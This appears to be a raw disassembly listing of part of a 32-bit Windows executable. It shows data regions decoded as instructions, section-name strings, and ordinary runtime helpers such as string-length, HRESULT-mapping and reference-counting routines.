  401751:	sbb    BYTE PTR [eax+0x0],al
	...
  40175c:	add    eax,DWORD PTR [eax]
  40175e:	add    BYTE PTR [eax],al
  401760:	hlt    
  401761:	sbb    BYTE PTR [eax+0x0],al
  401764:	rcl    BYTE PTR [edi],1
  401766:	inc    eax
  401767:	add    BYTE PTR [eax],al
  401769:	add    BYTE PTR [eax],al
  40176b:	add    ah,al
  40176d:	jo     0x4017af
  40176f:	add    BYTE PTR [edx],al
  401771:	add    BYTE PTR [eax],al
  401773:	add    BYTE PTR [eax],al
  401775:	add    BYTE PTR [eax],al
  401777:	add    bh,bh
  401779:	(bad)  
  40177a:	(bad)  
  40177b:	inc    DWORD PTR [eax]
  40177d:	add    BYTE PTR [eax],al
  40177f:	add    BYTE PTR [eax+0x0],al
  401782:	add    BYTE PTR [eax],al
  401784:	push   esp
  401785:	pop    ss
  401786:	inc    eax
  401787:	add    ah,ah
  401789:	jo     0x4017cb
  40178b:	add    BYTE PTR [edx],al
  40178d:	add    BYTE PTR [eax],al
  40178f:	add    BYTE PTR [eax],al
  401791:	add    BYTE PTR [eax],al
  401793:	add    bh,bh
  401795:	(bad)  
  401796:	(bad)  
  401797:	inc    DWORD PTR [eax]
  401799:	add    BYTE PTR [eax],al
  40179b:	add    BYTE PTR [eax+0x0],al
  40179e:	add    BYTE PTR [eax],al
  4017a0:	cmp    BYTE PTR [eax],bl
  4017a2:	inc    eax
  4017a3:	add    BYTE PTR [eax],bl
  4017a5:	jno    0x4017e7
	...
  4017af:	add    bh,bh
  4017b1:	(bad)  
  4017b2:	(bad)  
  4017b3:	inc    DWORD PTR [eax]
  4017b5:	add    BYTE PTR [eax],al
  4017b7:	add    BYTE PTR [eax+0x0],al
  4017ba:	add    BYTE PTR [eax],al
  4017bc:	rcl    BYTE PTR [edi],0x40
	...
  4017c7:	add    BYTE PTR [ecx],al
  4017c9:	add    BYTE PTR [eax],al
  4017cb:	add    BYTE PTR [eax+ebx*1],dl
  4017ce:	inc    eax
  4017cf:	add    BYTE PTR [eax+esi*2+0x40],ah
  4017d6:	add    BYTE PTR [eax],al
  4017d8:	add    BYTE PTR [eax],al
  4017da:	add    BYTE PTR [eax],al
  4017dc:	(bad)  
  4017dd:	(bad)  
  4017de:	(bad)  
  4017df:	inc    DWORD PTR [eax]
  4017e1:	add    BYTE PTR [eax],al
  4017e3:	add    BYTE PTR [eax+0x0],al
  4017e6:	add    BYTE PTR [eax],al
  4017e8:	xor    BYTE PTR [edi],dl
  4017ea:	inc    eax
  4017eb:	add    BYTE PTR [eax+ebx*1],bl
  4017ee:	inc    eax
  4017ef:	add    BYTE PTR [eax+0x18],bh
  4017f2:	inc    eax
  4017f3:	add    BYTE PTR [eax],al
  4017f5:	add    BYTE PTR [eax],al
  4017f7:	add    BYTE PTR [eax+0x71],dl
  4017fa:	inc    eax
  4017fb:	add    BYTE PTR [ebx],al
  4017fd:	add    BYTE PTR [eax],al
  4017ff:	add    BYTE PTR [eax],al
  401801:	add    BYTE PTR [eax],al
  401803:	add    bh,bh
  401805:	(bad)  
  401806:	(bad)  
  401807:	inc    DWORD PTR [eax]
  401809:	add    BYTE PTR [eax],al
  40180b:	add    BYTE PTR [eax+0x0],al
  40180e:	add    BYTE PTR [eax],al
  401810:	aam    0x18
  401812:	inc    eax
  401813:	add    BYTE PTR [edi+edx*1+0x40],ah
  40181a:	add    BYTE PTR [eax],al
  40181c:	test   BYTE PTR [eax+0x40],dh
  40181f:	add    BYTE PTR [ecx],al
  401821:	add    BYTE PTR [eax],al
  401823:	add    BYTE PTR [eax],al
  401825:	add    BYTE PTR [eax],al
  401827:	add    bh,bh
  401829:	(bad)  
  40182a:	(bad)  
  40182b:	inc    DWORD PTR [eax]
  40182d:	add    BYTE PTR [eax],al
  40182f:	add    BYTE PTR [eax+0x0],al
  401832:	add    BYTE PTR [eax],al
  401834:	push   esp
  401835:	sbb    BYTE PTR [eax+0x0],al
	...
  401840:	add    eax,DWORD PTR [eax]
  401842:	add    BYTE PTR [eax],al
  401844:	in     al,0x18
  401846:	inc    eax
  401847:	add    BYTE PTR [eax+ebx*1+0x17a40040],dl
  40184e:	inc    eax
	...
  40185b:	add    BYTE PTR [edx],al
  40185d:	add    BYTE PTR [eax],al
  40185f:	add    ah,ch
  401861:	pop    ss
  401862:	inc    eax
	...
  40186f:	add    ah,al
  401871:	jo     0x4018b3
  401873:	add    BYTE PTR [edi+edx*1+0x40],dl
  401877:	add    BYTE PTR [eax+esi*2+0x40],ah
  40187e:	add    BYTE PTR [eax],al
  401880:	add    al,0x0
  401882:	add    BYTE PTR [eax],al
  401884:	(bad)  
  401885:	(bad)  
  401886:	(bad)  
  401887:	inc    DWORD PTR [eax]
  401889:	add    BYTE PTR [eax],al
  40188b:	add    BYTE PTR [eax+0x0],al
  40188e:	add    BYTE PTR [eax],al
  401890:	xor    BYTE PTR [edi],dl
  401892:	inc    eax
  401893:	add    BYTE PTR [eax],dh
  401895:	jno    0x4018d7
  401897:	add    BYTE PTR [ecx],al
  401899:	add    BYTE PTR [eax],al
  40189b:	add    BYTE PTR [eax],al
  40189d:	add    BYTE PTR [eax],al
  40189f:	add    bh,bh
  4018a1:	(bad)  
  4018a2:	(bad)  
  4018a3:	inc    DWORD PTR [eax]
  4018a5:	add    BYTE PTR [eax],al
  4018a7:	add    BYTE PTR [eax+0x0],al
  4018aa:	add    BYTE PTR [eax],al
  4018ac:	les    ebx,FWORD PTR [eax]
  4018ae:	inc    eax
  4018af:	add    al,bh
  4018b1:	pop    ss
  4018b2:	inc    eax
  4018b3:	add    BYTE PTR [eax+0x1c004017],cl
  4018b9:	sbb    BYTE PTR [eax+0x0],al
  4018bc:	js     0x4018d6
  4018be:	inc    eax
	...
  4018cb:	add    BYTE PTR [edx],al
  4018cd:	add    BYTE PTR [eax],al
  4018cf:	add    BYTE PTR [eax+0x18],cl
  4018d2:	inc    eax
	...
  4018db:	add    BYTE PTR [eax+eax*1],al
  4018de:	add    BYTE PTR [eax],al
  4018e0:	mov    al,0x18
  4018e2:	inc    eax
  4018e3:	add    BYTE PTR [eax+0x1c004017],cl
  4018e9:	sbb    BYTE PTR [eax+0x0],al
  4018ec:	js     0x401906
  4018ee:	inc    eax
  4018ef:	add    BYTE PTR [eax],al
  4018f1:	add    BYTE PTR [eax],al
  4018f3:	add    BYTE PTR [edi+edx*1+0x40],ch
  4018f7:	add    BYTE PTR [eax+ebx*1+0x17a40040],dl
  4018fe:	inc    eax
	...
  40190f:	add    al,ah
  401911:	pop    eax
  401912:	add    BYTE PTR [eax],al
  401914:	call   0x18401974
  401919:	pop    esp
  40191a:	add    BYTE PTR [eax],al
  40191c:	push   esi
  40191d:	pop    esp
  40191e:	add    BYTE PTR [eax],al
  401920:	jle    0x40197e
  401922:	add    BYTE PTR [eax],al
  401924:	mov    ah,0x5c
  401926:	add    BYTE PTR [eax],al
  401928:	neg    DWORD PTR [eax+eax*1+0x0]
  40192c:	xor    al,0x5d
  40192e:	add    BYTE PTR [eax],al
  401930:	je     0x40198f
  401932:	add    BYTE PTR [eax],al
  401934:	push   edx
  401935:	push   ebx
  401936:	inc    esp
  401937:	push   ebx
  401938:	xor    ebp,DWORD PTR [eax+0x6f]
  40193b:	imul   esp,DWORD PTR [esi],0xa544e347
  401941:	int3   
  401942:	int3   
  401943:	jns    0x40196d
  401945:	shr    BYTE PTR [ecx+0x1f9],1
  40194b:	add    BYTE PTR [eax+0x77],bh
  40194e:	imul   edi,DWORD PTR [edx+0x61],0x702e6472
  401955:	bound  eax,QWORD PTR fs:[eax]
	...
  40196c:	inc    edi
  40196d:	inc    ebx
  40196e:	push   esp
  40196f:	dec    esp
  401970:	add    BYTE PTR [eax],dl
  401972:	add    BYTE PTR [eax],al
  401974:	add    al,0x0
  401976:	add    BYTE PTR [eax],al
  401978:	cs inc ebx
  40197a:	push   edx
  40197b:	push   esp
  40197c:	and    al,0x58
  40197e:	inc    ebx
  40197f:	inc    ecx
  401980:	add    BYTE PTR [eax],al
  401982:	add    BYTE PTR [eax],al
  401984:	add    al,0x10
  401986:	add    BYTE PTR [eax],al
  401988:	add    al,0x0
  40198a:	add    BYTE PTR [eax],al
  40198c:	cs inc ebx
  40198e:	push   edx
  40198f:	push   esp
  401990:	and    al,0x58
  401992:	inc    ebx
  401993:	inc    ecx
  401994:	inc    ecx
  401995:	add    BYTE PTR [eax],al
  401997:	add    BYTE PTR [eax],cl
  401999:	adc    BYTE PTR [eax],al
  40199b:	add    BYTE PTR [eax],cl
  40199d:	add    BYTE PTR [eax],al
  40199f:	add    BYTE PTR [esi],ch
  4019a1:	inc    ebx
  4019a2:	push   edx
  4019a3:	push   esp
  4019a4:	and    al,0x58
  4019a6:	inc    ebx
  4019a7:	dec    esp
  4019a8:	add    BYTE PTR [eax],al
  4019aa:	add    BYTE PTR [eax],al
  4019ac:	adc    BYTE PTR [eax],dl
  4019ae:	add    BYTE PTR [eax],al
  4019b0:	add    al,0x0
  4019b2:	add    BYTE PTR [eax],al
  4019b4:	cs inc ebx
  4019b6:	push   edx
  4019b7:	push   esp
  4019b8:	and    al,0x58
  4019ba:	inc    ebx
  4019bb:	push   ebp
  4019bc:	add    BYTE PTR [eax],al
  4019be:	add    BYTE PTR [eax],al
  4019c0:	adc    al,0x10
  4019c2:	add    BYTE PTR [eax],al
  4019c4:	add    al,0x0
  4019c6:	add    BYTE PTR [eax],al
  4019c8:	cs inc ebx
  4019ca:	push   edx
  4019cb:	push   esp
  4019cc:	and    al,0x58
  4019ce:	inc    ebx
  4019cf:	pop    edx
  4019d0:	add    BYTE PTR [eax],al
  4019d2:	add    BYTE PTR [eax],al
  4019d4:	sbb    BYTE PTR [eax],dl
  4019d6:	add    BYTE PTR [eax],al
  4019d8:	add    al,0x0
  4019da:	add    BYTE PTR [eax],al
  4019dc:	cs inc ebx
  4019de:	push   edx
  4019df:	push   esp
  4019e0:	and    al,0x58
  4019e2:	dec    ecx
  4019e3:	inc    ecx
  4019e4:	add    BYTE PTR [eax],al
  4019e6:	add    BYTE PTR [eax],al
  4019e8:	sbb    al,0x10
  4019ea:	add    BYTE PTR [eax],al
  4019ec:	add    al,0x0
  4019ee:	add    BYTE PTR [eax],al
  4019f0:	cs inc ebx
  4019f2:	push   edx
  4019f3:	push   esp
  4019f4:	and    al,0x58
  4019f6:	dec    ecx
  4019f7:	inc    ecx
  4019f8:	inc    ecx
  4019f9:	add    BYTE PTR [eax],al
  4019fb:	add    BYTE PTR [eax],ah
  4019fd:	adc    BYTE PTR [eax],al
  4019ff:	add    BYTE PTR [eax+eax*1],al
  401a02:	add    BYTE PTR [eax],al
  401a04:	cs inc ebx
  401a06:	push   edx
  401a07:	push   esp
  401a08:	and    al,0x58
  401a0a:	dec    ecx
  401a0b:	pop    ecx
  401a0c:	add    BYTE PTR [eax],al
  401a0e:	add    BYTE PTR [eax],al
  401a10:	and    al,0x10
  401a12:	add    BYTE PTR [eax],al
  401a14:	add    al,0x0
  401a16:	add    BYTE PTR [eax],al
  401a18:	cs inc ebx
  401a1a:	push   edx
  401a1b:	push   esp
  401a1c:	and    al,0x58
  401a1e:	dec    ecx
  401a1f:	pop    edx
  401a20:	add    BYTE PTR [eax],al
  401a22:	add    BYTE PTR [eax],al
  401a24:	sub    BYTE PTR [eax],dl
  401a26:	add    BYTE PTR [eax],al
  401a28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a29:	add    BYTE PTR [eax],al
  401a2b:	add    BYTE PTR [esi],ch
  401a2d:	imul   sp,WORD PTR [si+0x73],0x7824
  401a34:	add    BYTE PTR [eax],al
  401a36:	add    BYTE PTR [eax],al
  401a38:	rcl    BYTE PTR [eax],1
  401a3a:	add    BYTE PTR [eax],al
  401a3c:	pusha  
  401a3d:	push   es
  401a3e:	add    BYTE PTR [eax],al
  401a40:	cs jb  0x401aa7
  401a43:	popa   
  401a44:	je     0x401aa7
  401a46:	add    BYTE PTR [eax],al
  401a48:	xor    BYTE PTR [edi],dl
  401a4a:	add    BYTE PTR [eax],al
  401a4c:	rol    DWORD PTR [ecx],1
  401a4e:	add    BYTE PTR [eax],al
  401a50:	cs jb  0x401ab7
  401a53:	popa   
  401a54:	je     0x401ab7
  401a56:	and    al,0x72
  401a58:	add    BYTE PTR [eax],al
  401a5a:	add    BYTE PTR [eax],al
  401a5c:	adc    BYTE PTR [ecx],bl
  401a5e:	add    BYTE PTR [eax],al
  401a60:	and    al,0x0
  401a62:	add    BYTE PTR [eax],al
  401a64:	cs jb  0x401acb
  401a67:	popa   
  401a68:	je     0x401acb
  401a6a:	and    al,0x73
  401a6c:	js     0x401ad2
  401a6e:	popa   
  401a6f:	je     0x401ad2
  401a71:	add    BYTE PTR [eax],al
  401a73:	add    BYTE PTR [ecx+ebx*1],dh
  401a76:	add    BYTE PTR [eax],al
  401a78:	test   BYTE PTR [edx],al
  401a7a:	add    BYTE PTR [eax],al
  401a7c:	cs jb  0x401ae3
  401a7f:	popa   
  401a80:	je     0x401ae3
  401a82:	and    al,0x7a
  401a84:	jp     0x401b00
  401a86:	bound  esp,QWORD PTR fs:[edi+0x0]
  401a8a:	add    BYTE PTR [eax],al
  401a8c:	mov    eax,0xa000001b
  401a91:	add    BYTE PTR [eax],al
  401a93:	add    BYTE PTR [esi],ch
  401a95:	je     0x401afc
  401a97:	js     0x401b0d
  401a99:	and    al,0x64
  401a9b:	imul   eax,DWORD PTR [eax],0x60000000
  401aa1:	sbb    al,0x0
  401aa3:	add    BYTE PTR [ebx+0x3f],bh
  401aa6:	add    BYTE PTR [eax],al
  401aa8:	cs je  0x401b10
  401aab:	js     0x401b21
  401aad:	and    al,0x6d
  401aaf:	outs   dx,BYTE PTR ds:[esi]
  401ab0:	add    BYTE PTR [eax],al
  401ab2:	add    BYTE PTR [eax],al
  401ab4:	fistp  DWORD PTR [ebx+0x0]
  401ab7:	add    bh,al
  401ab9:	add    DWORD PTR [eax],eax
  401abb:	add    BYTE PTR [esi],ch
  401abd:	je     0x401b24
  401abf:	js     0x401b35
  401ac1:	and    al,0x78
  401ac3:	add    BYTE PTR [edx-0x4dffffa3],ah
  401ac9:	add    BYTE PTR [eax],al
  401acb:	add    BYTE PTR [esi],ch
  401acd:	je     0x401b34
  401acf:	js     0x401b45
  401ad1:	and    al,0x79
  401ad3:	add    BYTE PTR fs:[eax],al
  401ad6:	add    BYTE PTR [eax],al
  401ad8:	pop    eax
  401ad9:	pop    esi
  401ada:	add    BYTE PTR [eax],al
  401adc:	enter  0x3,0x0
  401ae0:	cs js  0x401b47
  401ae3:	popa   
  401ae4:	je     0x401b47
  401ae6:	and    al,0x78
  401ae8:	add    BYTE PTR [eax],al
  401aea:	add    BYTE PTR [eax],al
  401aec:	add    BYTE PTR [eax+0x0],dh
  401aef:	add    BYTE PTR [eax+0x0],dl
  401af2:	add    BYTE PTR [eax],al
  401af4:	cs fs popa 
  401af7:	je     0x401b5a
  401af9:	add    BYTE PTR [eax],al
  401afb:	add    BYTE PTR [eax+0x70],dl
  401afe:	add    BYTE PTR [eax],al
  401b00:	inc    eax
  401b01:	add    DWORD PTR [eax],eax
  401b03:	add    BYTE PTR [esi],ch
  401b05:	fs popa 
  401b07:	je     0x401b6a
  401b09:	and    al,0x72
  401b0b:	add    BYTE PTR [eax+0x4c000071],dl
  401b11:	add    al,0x0
  401b13:	add    BYTE PTR [esi],ch
  401b15:	bound  esi,QWORD PTR [ebx+0x73]
  401b18:	add    BYTE PTR [eax],al
  401b1a:	add    BYTE PTR [eax],al
  401b1c:	add    BYTE PTR [eax+0x1d80000],al
  401b22:	add    BYTE PTR [eax],al
  401b24:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x352461
  401b2d:	add    BYTE PTR [eax],al
  401b2f:	add    al,bl
  401b31:	add    DWORD PTR [eax],0x400
  401b37:	add    BYTE PTR [esi],ch
  401b39:	xor    BYTE PTR [eax],dh
  401b3b:	arpl   WORD PTR [esi+0x67],sp
  401b3e:	add    BYTE PTR [eax],al
  401b40:	fadd   QWORD PTR [ecx+0x1900000]
  401b46:	add    BYTE PTR [eax],al
  401b48:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x322461
  401b51:	add    BYTE PTR [eax],al
  401b53:	add    BYTE PTR [ebx+eax*4+0x0],ch
  401b57:	add    BYTE PTR [eax+eax*1],dl
  401b5a:	add    BYTE PTR [eax],al
  401b5c:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x332461
  401b65:	add    BYTE PTR [eax],al
  401b67:	add    BYTE PTR [eax-0x27ffff7d],al
  401b6d:	add    DWORD PTR [eax],eax
  401b6f:	add    BYTE PTR [esi],ch
  401b71:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x342461
  401b79:	add    BYTE PTR [eax],al
  401b7b:	add    BYTE PTR [eax-0x7b],bl
  401b7e:	add    BYTE PTR [eax],al
  401b80:	pop    esp
  401b81:	or     DWORD PTR [eax],eax
  401b83:	add    BYTE PTR [esi],ch
  401b85:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x362461
  401b8d:	add    BYTE PTR [eax],al
  401b8f:	add    BYTE PTR [eax],al
  401b91:	nop
  401b92:	add    BYTE PTR [eax],al
  401b94:	add    BYTE PTR [ebx],al
  401b96:	add    BYTE PTR [eax],al
  401b98:	cs jb  0x401c0e
  401b9b:	jb     0x401c00
  401b9d:	and    al,0x30
  401b9f:	xor    DWORD PTR [eax],eax
  401ba1:	add    BYTE PTR [eax],al
  401ba3:	add    BYTE PTR [eax],al
  401ba5:	xchg   ebx,eax
  401ba6:	add    BYTE PTR [eax],al
  401ba8:	cwde   
  401ba9:	imul   eax,DWORD PTR [eax],0x0
  401bac:	cs jb  0x401c22
  401baf:	jb     0x401c14
  401bb1:	and    al,0x30
  401bb3:	xor    al,BYTE PTR [eax]
	...
  401bbd:	add    BYTE PTR [eax],al
  401bbf:	add    BYTE PTR [ebx+0x1cbe56ff],cl
  401bc5:	jne    0x401c07
  401bc7:	add    BYTE PTR [ecx+0x40752c],bh
  401bcd:	mov    DWORD PTR ds:0x4075b4,esi
  401bd3:	call   0x401d4b
  401bd8:	test   eax,eax
  401bda:	jns    0x401be5
  401bdc:	mov    BYTE PTR ds:0x4075b0,0x1
  401be3:	jmp    0x401bef
  401be5:	mov    DWORD PTR ds:0x407520,0x24
  401bef:	push   0x405db0
  401bf4:	mov    DWORD PTR ds:0x40751c,0x4014f8
  401bfe:	mov    DWORD PTR ds:0x4075b8,esi
  401c04:	call   0x405223
  401c09:	pop    ecx
  401c0a:	pop    esi
  401c0b:	ret    
  401c0c:	int3   
  401c0d:	int3   
  401c0e:	int3   
  401c0f:	int3   
  401c10:	call   0x404796
  401c15:	push   0x405dd0
  401c1a:	call   0x405223
  401c1f:	pop    ecx
  401c20:	ret    
  401c21:	int3   
  401c22:	int3   
  401c23:	int3   
  401c24:	int3   
  401c25:	int3   
  401c26:	int3   
  401c27:	int3   
  401c28:	int3   
  401c29:	int3   
  401c2a:	int3   
  401c2b:	int3   
  401c2c:	int3   
  401c2d:	int3   
  401c2e:	int3   
  401c2f:	int3   
  401c30:	mov    ecx,0x407024
  401c35:	call   0x401d4b
  401c3a:	test   eax,eax
  401c3c:	jns    0x401c4c
  401c3e:	and    DWORD PTR ds:0x407020,0x0
  401c45:	mov    BYTE PTR ds:0x4075b0,0x1
  401c4c:	push   0x405df0
  401c51:	call   0x405223
  401c56:	pop    ecx
  401c57:	ret    
  401c58:	int3   
  401c59:	int3   
  401c5a:	int3   
  401c5b:	int3   
  401c5c:	int3   
  401c5d:	int3   
  401c5e:	int3   
  401c5f:	int3   
  401c60:	int3   
  401c61:	int3   
  401c62:	int3   
  401c63:	int3   
  401c64:	int3   
  401c65:	test   ecx,ecx
  401c67:	jne    0x401c6c
  401c69:	xor    eax,eax
  401c6b:	ret    
  401c6c:	lea    edx,[ecx+0x2]
  401c6f:	mov    ax,WORD PTR [ecx]
  401c72:	add    ecx,0x2
  401c75:	test   ax,ax
  401c78:	jne    0x401c6f
  401c7a:	sub    ecx,edx
  401c7c:	sar    ecx,1
  401c7e:	mov    eax,ecx
  401c80:	ret    
  401c81:	int3   
  401c82:	int3   
  401c83:	int3   
  401c84:	int3   
  401c85:	int3   
  401c86:	mov    edi,edi
  401c88:	push   ebp
  401c89:	mov    ebp,esp
  401c8b:	push   esi
  401c8c:	push   edi
  401c8d:	mov    edi,ecx
  401c8f:	mov    esi,edx
  401c91:	mov    ecx,DWORD PTR [ebp+0x8]
  401c94:	call   0x401c65
  401c99:	lea    eax,[eax*2+0x2]
  401ca0:	push   eax
  401ca1:	push   DWORD PTR [ebp+0x8]
  401ca4:	lea    eax,[esi+esi*1]
  401ca7:	push   eax
  401ca8:	push   edi
  401ca9:	call   DWORD PTR ds:0x4081ac
  401caf:	add    esp,0x10
  401cb2:	neg    eax
  401cb4:	sbb    eax,eax
  401cb6:	inc    eax
  401cb7:	pop    edi
  401cb8:	pop    esi
  401cb9:	pop    ebp
  401cba:	ret    0x4
  401cbd:	int3   
  401cbe:	int3   
  401cbf:	int3   
  401cc0:	int3   
  401cc1:	int3   
  401cc2:	push   0x0
  401cc4:	push   0x0
  401cc6:	push   0x1
  401cc8:	push   ecx
  401cc9:	call   DWORD PTR ds:0x408048
  401ccf:	ret    
  401cd0:	int3   
  401cd1:	int3   
  401cd2:	int3   
  401cd3:	int3   
  401cd4:	int3   
  401cd5:	mov    edi,edi
  401cd7:	push   ebp
  401cd8:	mov    ebp,esp
  401cda:	mov    eax,DWORD PTR [ebp+0x8]
  401cdd:	mov    DWORD PTR [ecx],eax
  401cdf:	mov    eax,ecx
  401ce1:	pop    ebp
  401ce2:	ret    0x4
  401ce5:	int3   
  401ce6:	int3   
  401ce7:	int3   
  401ce8:	int3   
  401ce9:	int3   
  401cea:	mov    edi,edi
  401cec:	push   ebp
  401ced:	mov    ebp,esp
  401cef:	push   ecx
  401cf0:	push   ecx
  401cf1:	push   ecx
  401cf2:	lea    ecx,[ebp-0x8]
  401cf5:	call   0x401cd5
  401cfa:	push   0x4061f4
  401cff:	mov    eax,DWORD PTR [eax]
  401d01:	mov    DWORD PTR [ebp-0x4],eax
  401d04:	lea    eax,[ebp-0x4]
  401d07:	push   eax
  401d08:	call   0x405508
  401d0d:	int3   
  401d0e:	int3   
  401d0f:	int3   
  401d10:	int3   
  401d11:	int3   
  401d12:	int3   
  401d13:	test   ecx,ecx
  401d15:	je     0x401d43
  401d17:	cmp    ecx,0xc
  401d1a:	je     0x401d3c
  401d1c:	cmp    ecx,0x16
  401d1f:	je     0x401d35
  401d21:	cmp    ecx,0x22
  401d24:	je     0x401d35
  401d26:	cmp    ecx,0x50
  401d29:	je     0x401d43
  401d2b:	mov    ecx,0x80004005
  401d30:	jmp    0x401cea
  401d35:	mov    ecx,0x80070057
  401d3a:	jmp    0x401d30
  401d3c:	mov    ecx,0x8007000e
  401d41:	jmp    0x401d30
  401d43:	mov    eax,ecx
  401d45:	ret    
  401d46:	int3   
  401d47:	int3   
  401d48:	int3   
  401d49:	int3   
  401d4a:	int3   
  401d4b:	push   0xc
  401d4d:	push   0x405e58
  401d52:	call   0x405a08
  401d57:	xor    esi,esi
  401d59:	mov    DWORD PTR [ebp-0x4],esi
  401d5c:	push   ecx
  401d5d:	call   DWORD PTR ds:0x408110
  401d63:	jmp    0x401d80
  401d65:	mov    eax,DWORD PTR [ebp-0x14]
  401d68:	mov    eax,DWORD PTR [eax]
  401d6a:	xor    ecx,ecx
  401d6c:	cmp    DWORD PTR [eax],0xc0000017
  401d72:	sete   cl
  401d75:	mov    eax,ecx
  401d77:	ret    
  401d78:	mov    esp,DWORD PTR [ebp-0x18]
  401d7b:	mov    esi,0x8007000e
  401d80:	mov    DWORD PTR [ebp-0x1c],esi
  401d83:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401d8a:	mov    eax,esi
  401d8c:	call   0x405a4d
  401d91:	ret    
  401d92:	int3   
  401d93:	int3   
  401d94:	int3   
  401d95:	int3   
  401d96:	int3   
  401d97:	call   DWORD PTR ds:0x408050
  401d9d:	test   eax,eax
  401d9f:	jle    0x401da9
  401da1:	movzx  eax,ax
  401da4:	or     eax,0x80070000
  401da9:	ret    
  401daa:	int3   
  401dab:	int3   
  401dac:	int3   
  401dad:	int3   
  401dae:	int3   
  401daf:	test   ecx,ecx
  401db1:	jle    0x401dbc
  401db3:	movzx  ecx,cx
  401db6:	or     ecx,0x80070000
  401dbc:	mov    eax,ecx
  401dbe:	ret    
  401dbf:	int3   
  401dc0:	int3   
  401dc1:	int3   
  401dc2:	int3   
  401dc3:	int3   
  401dc4:	mov    edi,edi
  401dc6:	push   ebp
  401dc7:	mov    ebp,esp
  401dc9:	push   ecx
  401dca:	mov    eax,ds:0x40700c
  401dcf:	xor    eax,ebp
  401dd1:	mov    DWORD PTR [ebp-0x4],eax
  401dd4:	push   ebx
  401dd5:	push   edi
  401dd6:	mov    edi,ecx
  401dd8:	lea    ebx,[edi+0x4]
  401ddb:	cmp    DWORD PTR [ebx],0x0
  401dde:	je     0x401e17
  401de0:	cmp    DWORD PTR [edi+0xc],0x0
  401de4:	je     0x401df1
  401de6:	mov    ecx,ebx
  401de8:	call   0x403e26
  401ded:	and    DWORD PTR [edi+0xc],0x0
  401df1:	mov    ecx,DWORD PTR [edi+0x28]
  401df4:	test   ecx,ecx
  401df6:	je     0x401e0a
  401df8:	mov    eax,DWORD PTR [ecx]
  401dfa:	push   esi
  401dfb:	push   ecx
  401dfc:	mov    esi,DWORD PTR [eax+0x8]
  401dff:	mov    ecx,esi
  401e01:	call   DWORD PTR ds:0x4081d8
  401e07:	call   esi
  401e09:	pop    esi
  401e0a:	lea    eax,[edi+0x10]
  401e0d:	push   eax
  401e0e:	call   DWORD PTR ds:0x408114
  401e14:	and    DWORD PTR [ebx],0x0
  401e17:	mov    ecx,DWORD PTR [ebp-0x4]
  401e1a:	pop    edi
  401e1b:	xor    ecx,ebp
  401e1d:	pop    ebx
  401e1e:	call   0x405170
  401e23:	mov    esp,ebp
  401e25:	pop    ebp
  401e26:	ret    
  401e27:	int3   
  401e28:	int3   
  401e29:	int3   
  401e2a:	int3   
  401e2b:	int3   
  401e2c:	int3   
  401e2d:	int3   
  401e2e:	int3   
  401e2f:	int3   
  401e30:	xor    eax,eax
  401e32:	inc    eax
  401e33:	lock xadd DWORD PTR [ecx+0x8],eax
  401e38:	inc    eax
  401e39:	ret    
  401e3a:	int3   
  401e3b:	int3   
  401e3c:	int3   
  401e3d:	int3   
  401e3e:	int3   
  401e3f:	int3   
  401e40:	or     eax,0xffffffff
  401e43:	lock xadd DWORD PTR [ecx+0x8],eax
  401e48:	dec    eax
  401e49:	ret    
  401e4a:	int3   
  401e4b:	int3   
  401e4c:	int3   
  401e4d:	int3   
  401e4e:	int3   
  401e4f:	int3   
  401e50:	mov    eax,DWORD PTR [ecx+0x8]
  401e53:	ret    
  401e54:	int3   
  401e55:	int3   
  401e56:	int3   
  401e57:	int3   
  401e58:	int3   
  401e59:	int3   
  401e5a:	int3   
  401e5b:	int3   
  401e5c:	int3   
  401e5d:	int3   
  401e5e:	int3   
  401e5f:	int3   
  401e60:	mov    edi,edi
  401e62:	push   ebp
  401e63:	mov    ebp,esp
  401e65:	push   ecx
  401e66:	mov    eax,ds:0x40700c
  401e6b:	xor    eax,ebp
  401e6d:	mov    DWORD PTR [ebp-0x4],eax
  401e70:	push   ebx
  401e71:	mov    ebx,DWORD PTR [ebp+0x8]
  401e74:	test   ebx,ebx
  401e76:	jne    0x401e7f
  401e78:	mov    eax,0x80004003
  401e7d:	jmp    0x401ebe
  401e7f:	push   esi
  401e80:	push   edi
  401e81:	xor    edi,edi
  401e83:	lea    esi,[ecx+0x28]
  401e86:	cmp    DWORD PTR [esi],edi
  401e88:	jne    0x401ea4
  401e8a:	push   esi
  401e8b:	push   0x4015b0
  401e90:	push   0x1
  401e92:	push   edi
  401e93:	push   0x4015e4
  401e98:	call   DWORD PTR ds:0x408030
  401e9e:	mov    edi,eax
  401ea0:	test   edi,edi
  401ea2:	js     0x401eba
  401ea4:	mov    ecx,DWORD PTR [esi]
  401ea6:	mov    DWORD PTR [ebx],ecx
  401ea8:	mov    ecx,DWORD PTR [esi]
  401eaa:	push   ecx
  401eab:	mov    edx,DWORD PTR [ecx]
  401ead:	mov    esi,DWORD PTR [edx+0x4]
  401eb0:	mov    ecx,esi
  401eb2:	call   DWORD PTR ds:0x4081d8
  401eb8:	call   esi
  401eba:	mov    eax,edi
  401ebc:	pop    edi
  401ebd:	pop    esi
  401ebe:	mov    ecx,DWORD PTR [ebp-0x4]
  401ec1:	xor    ecx,ebp
  401ec3:	pop    ebx
  401ec4:	call   0x405170
  401ec9:	mov    esp,ebp
  401ecb:	pop    ebp
  401ecc:	ret    0x4
  401ecf:	int3   
  401ed0:	int3   
  401ed1:	int3   
  401ed2:	int3   
  401ed3:	int3   
  401ed4:	mov    edi,edi
  401ed6:	push   ebp
  401ed7:	mov    ebp,esp
  401ed9:	push   ebx
  401eda:	mov    ebx,edx
  401edc:	push   esi
  401edd:	xor    esi,esi
  401edf:	lea    edx,[ebx-0x1]
  401ee2:	test   edx,edx
  401ee4:	je     0x401f16
  401ee6:	push   edi
  401ee7:	mov    edi,DWORD PTR [ebp+0x8]
  401eea:	movzx  eax,WORD PTR [edi]
  401eed:	test   ax,ax
  401ef0:	je     0x401f15
  401ef2:	mov    WORD PTR [ecx+esi*2],ax
  401ef6:	push   0x27
  401ef8:	pop    eax
  401ef9:	cmp    WORD PTR [edi],ax
  401efc:	jne    0x401f0d
  401efe:	lea    eax,[ebx-0x2]
  401f01:	cmp    esi,eax
